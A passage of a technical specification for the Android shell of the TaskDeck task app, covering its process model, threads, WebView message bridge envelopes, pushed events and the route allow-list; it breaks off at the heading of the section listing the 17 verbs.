# TaskDeck sync spec: bridge

*The Android app around the phone page: one process and one core, the bridge that carries the page's requests to native code and pushes changes back, the allow-list of what it answers, every change to the forked page, the hardened WebView and its exfiltration harness, the JNI surface, the platform rules, the native screens, background work, reminders and the speed budgets. Owning stage: `android-shell`; clauses that need the real device runtime belong to `android`. Conventions, notation and the glossary are in [`README.md`](README.md); this spec does not restate them.*

## 1. Scope

This spec fixes everything under `android/` (the Gradle project, the Kotlin shell, the forked page in `android/page/`) and `crates/taskdeck-android/` (the JNI library `libtaskdeck.so`). It realises:

- SYNC.md §2.1 (the Android row: one process, Kotlin shell, WebView with the bundled page, `libtaskdeck.so` over JNI, JobScheduler jobs, exact alarms, native screens, Keystore; the permission list), §2.2 (the WebView has no network), §3 (the Android column: agenda and day views, verbs with Undo, the Done tab, the notepad with a base, weather with the phone's own place, the desk's palette, the phone's own Look, the shared picture, the overlay, offline editing applied at once, sync status and the new administration rows, reminders), §4.9 (the Android rows of the latency table), §5.3 step 1 and step 3 (BIOMETRIC_STRONG without PIN fallback; the code field), §5.6 (the Keystore row, DOM storage off, device-protected storage for reminder times and pending actions), §7 (the WebView, push, compromised-device and account-takeover rows), §8 (the Android paragraph);
- R1 §6 (the page's features and seams), R2 in full (as amended by SYNC.md and SYNC_PLAN.md);
- the verifier findings V1-9 (frames, `RTC*`, link hints, the harness, the two-app fallback), V1-14 (synced pictures decoded only as JPEG, in Rust), V1-19 (lock-screen actions behind authentication; no notification delegation), V3-6 (preferences, staleness, asynchronous refusals, notes conflicts, "will be refused" marks), V3-12 (the shared picture re-encoded before the WebView sees it), V3-13 (the Doze budget and the SDK gaps), V3-16 (the full Gradle dependency set, the platform verifier's Android part), V3-17 (what `libtaskdeck.so` links), V3-19 (desk-only features on the phone), and V3's smaller notes (`/api/wait` as a push, the StrongBox cost against the cold start);
- SYNC_PLAN.md §2 (minSdk 26, the forked page, limited administration from the phone, reminders in `android`, no `.ics` feed, separate crates), §3.4, §5 (WebView 58 on the API 26 image against 133 on API 36; no emulator in containers), §6.6 (`android-shell`) and §6.10 (`android`);
- the rulings S4 (the relay address may be pasted), S8 (the phone may take every duty), S9, S19 (reminder leads), S26 (`unsafe` only in the JNI entry points), S29 (the phone's own picture), S30 (device authentication on the phone needs API 30), S31 (`ACCESS_NETWORK_STATE`) of `docs/sync/status/foundation.md`.

Non-goals, each owned elsewhere:

- the facade, the store, transport, fetchers, blobs and the key-store trait: `device.md` (this spec calls the facade and implements the Android key store's Kotlin half);
- intents, the compile step, the snapshot JSON and `reminders()`: `core.md`;
- the engine's status, notices, banners, halts and evidence: `engine.md`;
- pairing, codes, fingerprints and the relay address: `seal.md`, `relay.md`;
- the release signing of the APK and the release workflow: stage `release`;
- push, widgets, a tile, a share target, a calendar export, archive search and Forget on the phone, subscription management, palette and home-place setters on the phone: the backlog (SYNC_PLAN.md §6.13).

There is no hub and no always-on device (SYNC_PLAN.md §2). The phone is a full replica and may take every duty (ruling S8).

## 2. Terms

| Term | Meaning |
|---|---|
| shell | The Kotlin code of the app under `android/app/`: activities, the bridge, jobs, receivers, the key vault. |
| page | The forked phone page, `android/page/index.html`, bundled into the APK. |
| fork base | `src/phone.html` at commit `1cfff2f`: 5,704 lines, 288,367 bytes, SHA-256 `61d13f54d6d6320e8315750935b25fafe0cabca24ad45d7ef88e577ac8f787d5`. Line numbers written "phone.html:N" refer to it. |
| asset origin | `https://appassets.androidplatform.net`, the origin `WebViewAssetLoader` serves (R2 §7). |
| bridge | The channel between the page and the shell (README §9), carried by a `WebMessageListener` (§5). |
| port | The JavaScript object `TaskDeckBridge` that `WebViewCompat.addWebMessageListener` injects into the page (§5.1). |
| reply proxy | The `JavaScriptReplyProxy` the shell receives with each message of a page load; the only way the shell posts to that load. |
| page load | One document of the page in one WebView, from its `ready` message (§5.2) until the next `ready`, a navigation of the WebView, or the WebView's destruction. Named by its `load` value. |
| envelope | One JSON message on the bridge (§5.2, §5.3). |
| route | A `(method, path)` the bridge answers (§6). |
| verb | One of the 17 `op` values the page posts to `POST /api/command` (§6.3). |
| backend | The Rust code that answers the Rust-side routes: `EchoBackend` in `android-shell`, `DeviceBackend` in `android` (§6.7, §11). |
| echo backend | The backend of the `echo` build flavour: fixtures in, verbs recorded, no core (§6.7). |
| core host | The Kotlin singleton `CoreHost` that owns the one open native core of the process (§4.3). |
| watcher | The shell thread that waits for change counters and turns them into pushed events, alarm rescheduling and notifications (§4.4). |
| native screens | The Kotlin activities Pair, Devices and Health (§13). |
| key vault | The Kotlin object `KeyVault` that holds the Android Keystore key and wraps and unwraps `L_d` for `AndroidKeyStore` (§11.5, §12.5). |
| DP store | The file `reminders.json` in device-protected storage (§15.6). |
| sync line | The masthead text that says how fresh the phone's board is (§8.3, A-03). |
| auth | BIOMETRIC_STRONG device authentication with no device-credential fallback, run by the shell immediately before a facade call that `device.md` §17 marks "auth" (§13.2). |
| flavour | A Gradle product flavour: `echo` (`android-shell`'s backend, tests only) or `full` (the device runtime; the only one `release` builds). |

## 3. Rules for every implementation

These hold for all code under `android/` and `crates/taskdeck-android/` except tests and the timing harness.

- **BRIDGE-GEN-001** (android-shell) The crate `taskdeck-android` MUST declare `#![deny(unsafe_code)]` at its root and MUST allow `unsafe` only in the module `jni_entry`, whose every `unsafe` block or attribute MUST carry a `// SAFETY:` comment (ruling S26).
- **BRIDGE-GEN-002** (android-shell) `taskdeck-android` MUST NOT contain an implementation of any hash, MAC, cipher, signature or random generator, and MUST compute SHA-256 only through the `sha2` crate.
- **BRIDGE-GEN-003** (android-shell) Every JNI entry point of `taskdeck-android` MUST run its body inside `std::panic::catch_unwind` and MUST answer a caught panic as §11.6 states, never by unwinding into the JVM.
- **BRIDGE-GEN-004** (android-shell) Every parser on the bridge (the envelope of §5.2, route bodies of §6, the configuration of §11.3, the zone of §12.7, `call` arguments of §11.4) MUST check the input's length against its limit in §18 before it parses the input, and MUST be strict as README §5.3 states: unknown fields, duplicate keys, floating-point numbers where an integer is expected, and trailing data are errors.
- **BRIDGE-GEN-005** (android-shell) The shell and `taskdeck-android` MUST NOT write any log line, console message or crash report, except the one timing line of §16.1 in the `echoTiming` and `fullTiming` variants; `onConsoleMessage` MUST return `true` without recording the message.
- **BRIDGE-GEN-006** (android-shell) The shell and `taskdeck-android` MUST NOT put a token, a key, a pairing code, a seed, a relay door or a subscription URL into any reply, event, notification, error or exception message.
- **BRIDGE-GEN-010** (android) The shell MUST NOT put board text (item names, notes) anywhere except into the page's replies and events, the reminder notifications of §15 and the native screens' views of the facade.
- **BRIDGE-GEN-007** (android-shell) Every value that holds `L_d`, a Keystore wrap's plaintext or a typed pairing code MUST be held in Rust in a `zeroize::Zeroizing` value and in Kotlin in a `ByteArray` or `CharArray` that is overwritten with zeros (`fill(0)`) as soon as the call that needs it returns, and MUST NOT be converted to a Java or Kotlin `String`.
- **BRIDGE-GEN-008** (android-shell) The app MUST NOT contain any code that sends a network request itself: every connection to the relay, an ICS host or Open-Meteo MUST be made by `taskdeck-device` inside `libtaskdeck.so`, and the shell MUST NOT use `java.net`, `javax.net`, `android.net.http` or `HttpURLConnection` except through the platform verifier's Android component.
- **BRIDGE-GEN-009** (android-shell) `src/phone.html` MUST NOT be edited by `android-shell` or `android`; every change to the phone page MUST be made in `android/page/index.html` and MUST be one listed in §8.

## 4. Process model

### 4.1 One process

The app runs in exactly one Linux process, the one Android starts for its package. No component declares `android:process`, so activities, the job service and every receiver run in that process and reach the same `libtaskdeck.so` and the same core instance; this is how the one-writer rule of SYNC.md §4.1 (one facade per data folder, DEV-THREAD-009) holds on the phone (R2 §7). The WebView's renderer runs where Android puts it: in its own isolated, sandboxed process on most devices (no network, no file access), or inside the app process where the platform decides so; the shell declares nothing about it.

- **BRIDGE-PROC-001** (android-shell) The manifest MUST NOT carry an `android:process` attribute on the application or on any component.
- **BRIDGE-PROC-002** (android-shell) The app MUST load `libtaskdeck.so` exactly once per process, from `TaskDeckApp.onCreate`, and MUST NOT load any other native library of its own.

### 4.2 Components and what runs without the activity

| Component | Kind | Runs | With the activity? | Reaches the core |
|---|---|---|---|---|
| `MainActivity` | activity, launcher | the WebView and the bridge (§5) | is the activity | yes |
| `PairActivity`, `DevicesActivity`, `HealthActivity` | activities | the native screens (§13) | started from the page or from each other | yes |
| `SyncJobService` | `JobService` | the 30-minute job and the leaving job (§14) | no | yes |
| `AlarmReceiver` | receiver, not exported, `directBootAware` | one reminder firing (§15.4) | no | yes, when the user is unlocked |
| `ActionReceiver` | receiver, not exported, `directBootAware` | a notification action (§15.5) | no | yes, when the user is unlocked |
| `SystemReceiver` | receiver, exported, `directBootAware` | boot, time, zone, package and exact-alarm events (§15.3) | no | yes, when the user is unlocked |
| `TaskDeckApp` | `Application` | loads the library | — | no |

Every row that reaches the core does it through the core host (§4.3). No component other than these exists: no service other than the job service, no content provider, no widget, no tile, no share target.

### 4.3 The core instance

`CoreHost` is a Kotlin `object` holding the state `Closed`, `Opening`, `Open` or `Failed(code)`, guarded by one `java.util.concurrent.locks.ReentrantLock`. The native library keeps the matching Rust state: a `static CORE: std::sync::Mutex<Option<std::sync::Arc<dyn Backend>>>`, where the `full` flavour's backend holds the one `taskdeck_device::Device` of the process. `Open` carries no mode: the mode is the facade's and changes while the core is open (`device.md` DEV-FACADE-009), so the shell reads it from `DeviceStatus.mode` whenever it needs it (§5.8).

`CoreHost.ensureOpen(context)`, in order:

1. If the state is `Open` or `Failed`, return it.
2. If `UserManager.isUserUnlocked()` is false, return `Locked` without changing the state: the data folder lives in credential-encrypted storage, which is unreadable before the first unlock after a reboot.
3. Take the lock; if another thread is `Opening`, wait for it (at most 20,000 ms, then return `Failed("bridge/open_timeout")` without changing the state).
4. Set `Opening`; call `Native.initPlatform(context)` once per process (§11.2); build the configuration of §11.3; call `Native.open(config)`. On success set `Open`. On a failure with `device/keystore_unavailable` (the Keystore is not ready yet, `device.md` §12.1) set `Closed` and return `Failed(code)` for this call only, so that the next `ensureOpen` opens again; on any other failure set `Failed(code)`.

The core is never closed while the process lives: Android ends the process without notice, and the device runtime loses nothing durable when it is killed (`device.md` §7.6). `Native.close` exists for tests only (§11.2).

- **BRIDGE-PROC-003** (android-shell, android) Every component of §4.2 that reaches the core MUST obtain it only through `CoreHost.ensureOpen`, and the process MUST hold at most one open native core.
- **BRIDGE-PROC-004** (android) `CoreHost.ensureOpen` MUST NOT open the core while `UserManager.isUserUnlocked()` is false, and `TaskDeckApp.onCreate` MUST NOT open the core.
- **BRIDGE-PROC-005** (android-shell) The Rust side MUST keep the open backend in one process-wide `Mutex<Option<…>>`, MUST hold that mutex only to clone the handle or to change it, and MUST call no facade method while holding it.
- **BRIDGE-PROC-008** (android) After `Native.open` failed with `device/keystore_unavailable`, `CoreHost.ensureOpen` MUST return `Failed` with that code and MUST leave the state `Closed`, so that the next call opens again; after any other failure it MUST keep the state `Failed(code)`.

### 4.4 Threads

| Thread | Created by | Does | Never does |
|---|---|---|---|
| Android main thread | Android | WebView calls, receiving bridge messages (`onPostMessage`), posting to the reply proxy, activity lifecycle | any JNI call that can block: every `Native` function except `changes` |
| `bridge-io` | the bridge, one per process | every request of §6 except those marked "slow", one at a time, in arrival order | Android UI calls |
| `bridge-slow` | the bridge, one per process | the "slow" requests: `POST /api/place`, `POST /api/background` | Android UI calls other than asking for the location permission through the activity |
| `lifecycle` | the core host, one per process | `ensureOpen` from the activity, and the platform calls `set_foreground`, `notify_resume` and `set_zone` (§11.4), one at a time in arrival order | Android UI calls |
| `watcher` | the core host, while the core is open | loops on `Native.waitForChange(since, 60000)`; turns counters into pushed events (§5.4), reminder rescheduling (§15.3) and sync-problem notifications (§15.7) | facade writes |
| job and receiver workers | `SyncJobService`, the receivers (`goAsync`) | `ensureOpen`, `backgroundSync`, reminder firings, actions | — |
| Rust threads | `taskdeck-device` (`device.md` §4.2) | the runtime; the sync thread calls the key vault (§11.5); the TLS threads call the platform verifier's Android component | calling any other Java method |

The facade's writes block their calling thread (`device.md` §4.5), so no write is made from the Android main thread (DEV-THREAD-008).

- **BRIDGE-PROC-006** (android-shell) The shell MUST NOT call any `Native` function other than `Native.changes` from the Android main thread.
- **BRIDGE-PROC-007** (android-shell) The bridge MUST run the requests of one process on exactly two worker threads, `bridge-io` and `bridge-slow`, each taking its requests in arrival order, one at a time.

## 5. The bridge transport

### 5.1 Channel

The page talks to the shell through one `WebMessageListener`, registered on the WebView with `WebViewCompat.addWebMessageListener(webView, "TaskDeckBridge", setOf("https://appassets.androidplatform.net"), listener)` before the page is loaded. The platform injects the port `TaskDeckBridge` only into frames whose origin matches that rule. The page sends with `TaskDeckBridge.postMessage(text)` and receives with `TaskDeckBridge.onmessage = (event) => …`, reading `event.data`; the shell replies through the reply proxy it was handed with the page load's messages. `addJavascriptInterface` is never used: it exposes an object to every frame without an origin check (R2 §7). Every message is one UTF-8 JSON text (README §5.3); no `ArrayBuffer` messages are used (§5.7).

- **BRIDGE-MSG-001** (android-shell) The shell MUST register the bridge only with `WebViewCompat.addWebMessageListener`, with the object name `TaskDeckBridge` and the single allowed origin rule `https://appassets.androidplatform.net`, and MUST NOT call `addJavascriptInterface` anywhere.
- **BRIDGE-MSG-002** (android-shell) The listener MUST drop, without a reply, every message whose `sourceOrigin` is not exactly `https://appassets.androidplatform.net`, whose `isMainFrame` is false, or whose data is not a string.
- **BRIDGE-MSG-003** (android-shell) The shell MUST post to the page only through the reply proxy of the current page load (§5.6), and only from the Android main thread.

### 5.2 Envelope: page to native

Every message from the page is a JSON object with the field `k` saying which of three kinds it is.

**`ready`** — sent once per page load, before any request (§5.6):

| Field | Type | Required | Constraints | Meaning |
|---|---|---|---|---|
| `v` | integer | required | `1` | envelope version |
| `k` | string | required | `"ready"` | |
| `load` | string | required | 32 lowercase hex characters | a random value the page draws once per load with `crypto.getRandomValues` (16 bytes) |

**`req`** — one request:

| Field | Type | Required | Constraints | Meaning |
|---|---|---|---|---|
| `v` | integer | required | `1` | |
| `k` | string | required | `"req"` | |
| `id` | integer | required | 1 to 2^53 − 1; not the `id` of another request of this page load still in flight | the request id, echoed in the reply |
| `method` | string | required | `"GET"` or `"POST"` | |
| `path` | string | required | 1 to 2,048 bytes; starts with `/`; ASCII 0x21–0x7E only | the path and query, as the page's `api()` was given it |
| `body` | string | optional | at most 84,096 bytes of UTF-8 | a JSON body (`api()` was given a string) |
| `body_b64` | string | optional | at most 8,388,608 characters; base64 (README §5.4) | a binary body (`api()` was given an `ArrayBuffer`) |
| `headers` | object | optional | only the members below | |
| `headers.request_key` | string | optional | 1 to 128 characters of 0x21–0x7E | today's `X-TaskDeck-Request` (phone.html:1495) |
| `headers.clear` | boolean | optional | `true` only | today's `X-TaskDeck-Clear: 1` (phone.html:4684) |

`body` and `body_b64` are never both present. A `GET` carries neither.

**`mark`** — a timing mark for §16:

| Field | Type | Required | Constraints | Meaning |
|---|---|---|---|---|
| `v` | integer | required | `1` | |
| `k` | string | required | `"mark"` | |
| `name` | string | required | `"first_day"` | the page painted its first day (§16.2) |

**Checks, in order**, on each message (the listener runs steps 1 and 2 on the main thread and hands the text to `bridge-io` or `bridge-slow` for the rest):

1. BRIDGE-MSG-002.
2. The text is at most 8,392,704 UTF-16 code units long (`String.length`); else it is dropped without a reply and the per-load counter `dropped` is raised.
3. It parses as a JSON object by README §5.3's strict rules, and its `v` is `1`; else, if a top-level integer `id` can be read from it, the reply is `400 bridge/envelope`, otherwise it is dropped and `dropped` is raised.
4. Its fields match the table of its kind exactly; else `400 bridge/envelope` with the `id` when it has one, else dropped.
5. A `req` whose `id` is that of a request of this load still in flight is dropped (an `id` is never answered twice at once). The page numbers its own requests from 1 upward; the timing harness uses ids from 2^52 (§16.3).
6. A `req` that arrives before this load's `ready` is answered `409 bridge/no_ready`.
7. A `req` that would make more than 64 requests of this load in flight is answered `503 bridge/busy`.

- **BRIDGE-MSG-004** (android-shell) The shell MUST apply the seven checks of §5.2 to every message in order, and MUST NOT act on a message that fails one of them other than by the answer that check names.
- **BRIDGE-MSG-005** (android-shell) The shell MUST check a message's length against the limit of §5.2 step 2 before it parses the message.
- **BRIDGE-MSG-006** (android-shell) The page MUST send `ready` before its first `req` of every page load, with a fresh `load` value drawn from `crypto.getRandomValues`.

### 5.3 Envelope: native to page

**`res`** — the reply to one request, exactly one per accepted `req`:

| Field | Type | Required | Constraints | Meaning |
|---|---|---|---|---|
| `v` | integer | required | `1` | |
| `k` | string | required | `"res"` | |
| `id` | integer | required | the request's `id` | |
| `status` | integer | required | 200 to 599 | today's HTTP status for the same outcome (§6) |
| `body` | any JSON value | optional | | today's response body; on a status of 400 or above, `{"error": <message>}` |

**`ev`** — a pushed event (§5.4):

| Field | Type | Required | Constraints | Meaning |
|---|---|---|---|---|
| `v` | integer | required | `1` | |
| `k` | string | required | `"ev"` | |
| `ev` | string | required | a name of §5.4 | |
| `data` | object | required | the event's schema (§5.4) | |

A reply or an event is at most 16,777,216 UTF-16 code units long. A reply whose body would exceed it is replaced by `500 bridge/too_large`.

- **BRIDGE-MSG-007** (android-shell) The shell MUST send exactly one `res` for every `req` that passed §5.2 step 4 and was not dropped by step 5, unless its page load ended first (§5.6), and MUST NOT send a `res` for any other message.
- **BRIDGE-MSG-008** (android-shell) Every `res` and `ev` MUST match the tables of §5.3 and §5.4, and the shell MUST NOT post one longer than 16,777,216 UTF-16 code units.

### 5.4 Pushed events

Events replace the long poll: today's `/api/wait` held a request until the board's version moved (digest §3.7); here the watcher sees the change counters of the facade move (`device.md` §17.3) and pushes at once (V3's smaller notes). A `hello` is sent once per page load; every other event is sent when its counter moved since the last event of that name sent to this load.

| `ev` | Sent when | `data` |
|---|---|---|
| `hello` | after the load's `ready`, as soon as `CoreHost.ensureOpen` has returned `Open` or `Failed` (§5.8) | `{"mode": "local" \| "synced" \| "key_lost" \| "failed" \| "echo", "code": string (with `failed` only), "api": integer (the SDK level), "flavour": "echo" \| "full", "sync": <sync data> (absent in `echo`)}` |
| `changed` | `Changes.view` moved | `{"version": <Published::version()>}` |
| `sync` | `Changes.status` moved, or `Changes.view` moved while `pending_marks()` changed (`android` only) | the sync data below |
| `notices` | `Changes.notices` moved (`android` only) | the notices data below |
| `weather` | `Changes.weather` moved | `{}`: the page asks `GET /api/weather` again |
| `picture` | `Changes.picture` moved | `{}`: the page asks `GET /api/state` again |

**Sync data** (built from `DeviceStatus` and `Published::pending_marks()`, `device.md` §17.5, §17.8, `engine.md` §30.1):

| Field | Type | Required | Meaning |
|---|---|---|---|
| `mode` | `"local"`, `"synced"`, `"key_lost"` | required | `DeviceStatus.mode` |
| `session` | `"offline"`, `"connecting"`, `"reconciling"`, `"live"`, `"rejoining"` | optional; absent unless `synced` | `Status.session` |
| `last_synced_ms` | integer | optional | `Status.last_synced_ms` |
| `unreachable_since_ms` | integer | optional | `Status.unreachable_since_ms` |
| `paused_until_ms` | integer | optional | `Status.paused_until_ms` |
| `queued` | integer ≥ 0 | required | `Status.queued` (0 when not synced) |
| `doomed` | integer ≥ 0 | required | `Status.doomed` |
| `halted` | boolean | required | `Status.halt` is present |
| `stopped` | boolean | required | `Status.stops` is not empty |
| `banners` | integer ≥ 0 | required | the number of unacknowledged banners |
| `pending` | array | required | one object per `PendingMark` in its order: `{"op": string, "target": integer or absent, "doomed": string code or absent, "acknowledged": boolean}` |

**Notices data**:

| Field | Type | Required | Meaning |
|---|---|---|---|
| `self` | integer | optional | this device's `device_no` |
| `devices` | object | required | `device_no` in decimal → device name, for every device of `Status.devices` |
| `records` | array | required | every `NoticeView` of `Published::notices()` whose `dismissed` is false, in its order, each `{"seq": integer, "index": integer, "record": <the canonical record of core.md §10.7 as a JSON object>, "type": "notice" \| "refusal"}`: `seq` and `index` the `NoticeView`'s, `type` from its `NoticeRecord` variant |

`seq` and `index` are the engine's own (`engine.md` `NoticeEntry`, copied by `device.md` §17.5), the pair `dismiss_notice` takes.

- **BRIDGE-EVT-001** (android-shell) The shell MUST send `hello` exactly once per page load, after its `ready`, and before any other event to that load.
- **BRIDGE-EVT-002** (android-shell) The watcher MUST post a `changed` event to the current page load no later than 50 ms after `Native.waitForChange` returned counters whose `view` is above the last one it pushed, with `version` equal to the published version of that moment.
- **BRIDGE-EVT-003** (android) The watcher MUST post `sync` and `notices` events, built as the tables of §5.4 state, whenever their counters moved, and MUST send each to every new page load as part of its first events.
- **BRIDGE-EVT-004** (android-shell) The bridge MUST answer `GET /api/wait` with `404 bridge/no_route`: the long poll is replaced by the `changed` event.

### 5.5 Ordering, concurrency and timeouts

- Requests of one page load are answered by `bridge-io` in arrival order, except the two slow routes (§6), which `bridge-slow` answers in arrival order among themselves. A reply to a slow request may therefore overtake or be overtaken by replies to other requests; every reply carries its `id`, and the page matches by `id` only.
- Events and replies reach the page in the order the shell posts them. A `changed` event caused by a verb is posted after that verb's `res` when the `res` is posted first; the page does not rely on either order (A `load({quiet:true})` follows every successful verb today, phone.html:1777).
- At most 64 requests of a page load are in flight (§5.2 step 7).
- The page gives each request a timeout (§8.2, S-02): 15,000 ms, `POST /api/place` 30,000 ms, `POST /api/background` 60,000 ms. A request that times out on the page is still answered by the shell; the page ignores a `res` whose `id` it no longer waits for.

- **BRIDGE-MSG-009** (android-shell) The bridge MUST answer the requests it hands to `bridge-io` in arrival order and MUST start a request only after the previous one on the same thread returned.

### 5.6 Page loads, reloads and a recreated renderer

The shell knows one **current page load** per WebView: the `load` of the latest `ready` together with its reply proxy. A page load ends when a newer `ready` arrives, when the WebView starts a navigation (`onPageStarted`), when the renderer is gone (§9.7) or when the WebView is destroyed.

When a page load ends:

1. Every request of it not yet started is discarded, except a verb (`POST /api/command`), `POST /api/look`, `POST /api/background`, `POST /api/place`, `POST /api/prefs` and `POST /api/notice`, which still run: they are the user's actions and the facade makes them durable (`device.md` §17.4).
2. Every reply of it, whether its request ran before or after the end, is discarded instead of posted.
3. Its event counters are forgotten; the next load starts from a fresh `hello`.

The new page load boots from nothing (§8.2, S-12): it waits for `hello`, then loads the day. Nothing is replayed to it.

- **BRIDGE-MSG-010** (android-shell) When a page load ends, the shell MUST still run every write request of §5.6 step 1 that it had accepted, MUST discard every other request of that load not yet started, and MUST post no reply to the ended load.

### 5.7 Binary bodies

The page posts the picture it cropped (phone.html:4695-4716) as `body_b64`: standard base64 with padding of the JPEG bytes, built by the page from the `ArrayBuffer` (S-02). The shell passes the string unchanged to `Native.request`; `taskdeck-android` decodes it (decided here, §22), checking the decoded length (at most 6,291,456 bytes) from the string's length before it allocates. No other route accepts `body_b64`. Base64 is used instead of `ArrayBuffer` messages so that one message format works on every WebView this app accepts (§9.1) and the JNI surface stays strings in, strings out.

- **BRIDGE-MSG-011** (android-shell) `taskdeck-android` MUST compute the decoded length of a `body_b64` from its character count and MUST answer `400 bridge/picture_too_large` without decoding when it exceeds 6,291,456 bytes.
- **BRIDGE-MSG-012** (android-shell) A `body_b64` on any route other than `POST /api/background` MUST be answered `400 bridge/envelope`.

### 5.8 Before the core is open

`MainActivity.onCreate` creates the WebView and loads the page at once, and in parallel runs `CoreHost.ensureOpen` on `lifecycle`, so the page's own start and the core's open (key unwrap, reading the store, `device.md` §5.4) overlap. The page sends `ready` at the start of its script and waits for `hello` (S-12). Until `hello` arrives it shows nothing of the board. If 500 ms pass without `hello`, it shows the panel (the element that was the token gate, S-06) with the text "Opening the board…". The shell sends `hello`, its `mode` read from `DeviceStatus.mode` when it is sent:

| Core host state | `hello.mode` | What the page shows |
|---|---|---|
| `Open`, `DeviceStatus.mode` `LocalOnly` | `local` | the board (an empty local board before pairing); in `android` the sync line says the phone is not paired |
| `Open`, `DeviceStatus.mode` `Synced` | `synced` | the board |
| `Open`, `DeviceStatus.mode` `KeyLost` | `key_lost` | the panel: "This phone can no longer unlock its copy of the board. Pair it again to carry on." with a button "Open Devices" (`POST /api/screen`, §6.4.7) |
| `Failed(code)`, as `ensureOpen` returned it | `failed` | the panel: "TaskDeck could not open the board (<code>). Close the app and open it again." |
| `Locked` | not sent; the activity cannot run before the first unlock, because Android does not start a non-direct-boot activity then | — |
| echo flavour | `echo` | the board from the fixtures |

When 20,000 ms pass without `hello`, the page shows "TaskDeck is taking too long to open the board. Close the app and open it again." and keeps waiting.

When the mode changes while a page load is current (a join or re-pair finished, a lost identity forgotten, `device.md` DEV-FACADE-009), the watcher sees `Changes.status` move and `DeviceStatus.mode` differ from the `mode` that load's `hello` carried, and reloads the WebView (`WebView.reload()`); the new page load boots with a fresh `hello` (§5.6).

- **BRIDGE-MSG-013** (android-shell) The shell MUST start loading the page before `CoreHost.ensureOpen` returns, and MUST send `hello` to the current page load within 50 ms of `ensureOpen` returning `Open` or `Failed`.
- **BRIDGE-MSG-014** (android-shell) The page MUST NOT send any `req` before it has received `hello`, and MUST show the panel texts of §5.8 at 500 ms and 20,000 ms without `hello`.
- **BRIDGE-EVT-005** (android) When `DeviceStatus.mode` differs from the `mode` of the current page load's `hello`, the watcher MUST reload the WebView.

## 6. The allow-list

### 6.1 How a request is routed

A `req` that passed §5.2 is routed in order:

1. The shell's `BridgeRouter` splits `path` at the first `?` into the route path and the query, and looks up `(method, route path)` in the table of §6.2, comparing bytes exactly. No row: `404 bridge/no_route` with today's body `{"error":"No such page."}`. A known path with another method is no row.
2. A row whose "Answered by" is **Kotlin** is answered by the shell (§6.4.4, §6.4.5, §6.4.7, and the Kotlin part of `GET /api/weather`).
3. A row whose "Answered by" is **Rust** is passed as the request envelope's text, unchanged, to `Native.request` (§11.2) on the row's thread.
4. `Native.request` parses the envelope again (§5.2 steps 3 and 4), looks the route up in its own table, which holds exactly the Rust rows of §6.2 for its flavour, and answers anything else `404 bridge/no_route`.
5. The query of a `GET` is parsed as today's `parse_query` does (phone.rs:1083-1137): split at `&`, each pair at the first `=`, `+` becomes a space, `%XX` is decoded, a malformed escape is kept literally, and of duplicate keys the first wins. Unknown query keys are ignored, as today.

`Native.request` reaches the facade only through `PageFacade` (§21), a type that wraps `taskdeck_device::Device` and exposes exactly the methods named in the "Facade" column of §6.2 and §6.3, plus `changes()`. The administration surface of §11.4 is a different entry point that the page cannot reach.

- **BRIDGE-ROUTE-001** (android-shell) The bridge MUST answer exactly the routes of §6.2 for the build's flavour, MUST route them as the five steps of §6.1 state, and MUST answer every other `(method, path)` with `404 bridge/no_route`.
- **BRIDGE-ROUTE-002** (android-shell) `Native.request` MUST itself refuse every route that is not a Rust row of §6.2 for its flavour, whatever the shell passed it.
- **BRIDGE-ROUTE-003** (android) The `full` flavour's `Native.request` MUST call no facade method other than those of `PageFacade` (§21), and `PageFacade` MUST expose no other.

### 6.2 The route table

Replies are today's shapes (digest §3.2) unless the row says otherwise. "Thread" is §4.4's. "Stage" is the stage whose tests prove the row: `android-shell` proves it against the echo backend, `android` against the device runtime; a row with both is proven by each.

| # | Method, path | Request | Reply (200) | Answered by | Facade (`full`) | Thread | Stage |
|---|---|---|---|---|---|---|---|
| 1 | `GET /api/state` | query `from` (`YYYY-MM-DD`, year 1970 to 9999; default today in the device's zone), `days` (default 1; clamped silently to 1–31) | the snapshot JSON of `core.md` §14.3 | Rust | `Published::answer_snapshot(from, days, now)`, `Published::zone()` for "today" | io | android-shell, android |
| 2 | `GET /api/weather` | none | today's `weather::Report` JSON plus `for`, `via`, `here` (§6.4.2) | Rust, then Kotlin adds `here.at` | `Published::weather()`, `PageFacade::weather_place()` | io | android-shell, android |
| 3 | `POST /api/command` | `body`: one of the 17 verbs (§6.3); optional `headers.request_key` | `{"ok": true, "version": N}` plus `id`, `session`, `moved` when the compile step's `Reply` has them | Rust | `submit_json(body)` | io | android-shell, android |
| 4 | `POST /api/look` | `body` `{"blur": int, "light": int}` | `{"ok": true, "id": <picture id or null>, "kept": <bool>}` | Rust | `set_look_dials` | io | android-shell, android |
| 5 | `POST /api/background` | `body_b64` (a JPEG), or `headers.clear` and no body | `{"ok": true, "id": <picture id or null>}` | Rust | `set_own_picture`, `clear_own_picture` (`device.md` §14.3) | slow | android-shell, android |
| 6 | `POST /api/place` | `body` `{"source": "own"}` or `{"source": "home"}` | `{"ok": true, "here": {"latitude": number, "longitude": number, "at": int} or null}` | Kotlin | `set_weather_place` through `Native.call` (§11.4) | slow | android-shell, android |
| 7 | `POST /api/prefs` | `body` `{"key": string, "value": …}` (§8.4) | `{"ok": true}` | Kotlin | none | io | android-shell |
| 8 | `POST /api/notice` | `body` `{"seq": int, "index": int}` | `{"ok": true}` | Rust | `dismiss_notice(seq, index)` | io | android |
| 9 | `GET /api/notes_merge` | none | `{"merge": null}` or `{"merge": {"mine": string, "theirs": string, "base": int, "current": int}}` | Rust | `notes_merge()` | io | android |
| 10 | `POST /api/notes_resolve` | `body` `{"text": string}` | as row 3 | Rust | `resolve_notes(text)` | io | android |
| 11 | `POST /api/notes_discard` | `body` `{}` | `{"ok": true}` | Rust | `discard_notes_draft()` | io | android |
| 12 | `POST /api/screen` | `body` `{"name": "devices"}`, `{"name": "pair"}` or `{"name": "health"}` | `{"ok": true}` | Kotlin | none | io | android |
| 13 | `GET /api/echo` | none | §6.7 | Rust | none: `echo` flavour only | io | android-shell |

Rows 8 to 12 do not exist in the `echo` flavour; row 13 exists only in it. The page's assets (`/`, `/index.html`, `/weather/<stem>.svg`, `/bg-<id>.jpg`) are not bridge routes: the WebView asks for them and the asset handler answers (§7).

### 6.3 The 17 verbs

